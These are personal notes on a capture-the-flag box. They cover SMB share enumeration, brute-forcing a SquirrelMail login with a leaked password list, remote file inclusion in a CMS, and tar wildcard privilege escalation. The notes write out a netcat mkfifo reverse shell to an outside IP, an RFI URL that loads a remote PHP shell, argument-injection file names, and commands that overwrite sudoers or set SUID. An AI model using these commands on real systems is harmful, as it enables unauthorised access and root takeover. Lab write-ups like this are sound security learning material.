initial scans show open ports 22,80,110,143, 139,445
110 is pop3, 143 is imap
139ms 445 is smb

autorecon showed anonymous share has read only access
so, we login using anonymous to smb.
`smbclient //10.201.49.46/anonymous`
OR
`smbclient //10.201.49.46/anonymous -U nothing%nothing`
once logged in, simply do
`get [filename]` to download it. `ls` works `l` shows hidden files as well. so does `help`

The log1.txt has a bunch of plaintext passwords.
Squirrel mail login page that was revaled with feroxbuster.
login using the guy's name in attention.txt - milsyson
send the req to burp, intruder, import the log1.txt list, sniper attack reveals the matched password for squirrel mail
Inside, there is a mail where he recieved his new password. presumably, this is for his smb share.

`smbclient //10.201.49.46/milesdyson -U milesdyson`
There, the hidden files reveals a beta cms, which has a rfi/lfi vulnerability
If we serve a php reverse shell loclally, we can make the url fetch it and run it for us, giving a reverse shell.
The vulnhub exploit mentions the url as target/cuppa/alerts....
but the cuppa is to be removed in our case.
```txt
alerts/alertConfigField.php?urlConfig=http://10.17.34.38/php-reverse-shell.php
```

Now, we have a reverse shell, we find it is running a cronjob as 
```zsh
cd /var/www/html #which is writable by us
tar cf out.tar.gz *
```
This means the tar is looking for any file inside that html dir, and trying to compress it
Now, the wildcard in use is our chance to exploit this.
The article at https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ explains how wildcards can be exploited with the associated command, by creating new files with such names that spoof the arguements of that command.
Since the wildcard is processed before the command itself, the cmd matches the wildcard to the filenames, which ultimately makes the command execute our reverse shell.

---
#### Tar wildcard exploit - Pivilege escalation

Method 1 - reverse Shell
So, first create a file with the reverse shell there. a simple mkfifo should do.
`echo "mkfifo /tmp/f; nc 10.17.34.38 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" > rshell_lin.sh`
Now, create a file that seems like an argument of the tar command.
`echo "" > "--checkpoint-action=exec=sh rshell_lin.sh"`
`echo "" > --checkpoint=1`

Method 2 - give sudo right to non-root user by adding him sudoers file
here, instead of rhsell_lin.sh having a reverse shell, we put the code to add our user to sudoer file. replace "ignite" with www-data or whatever low-priv user you are as.
`echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > rshell_lin.sh`
and as before, create the 2 checkpoint files.
Then sudo -l after the crontab runs.

Method 3 - give SUID bit to a binary, that gtfo bins records as vulnerable
`echo "chmod u+s /usr/bin/find" > rshell_lin.sh`
and again, the other 2 checkpoint files.

Note - ONLY WORKS WHEN the wildcard is free, and without the absolute path
i.e command arg1 * is vulnerable
command arg1 path/to/dir/* is not (cuz the resulting checkpoint will result as path/to/dir/)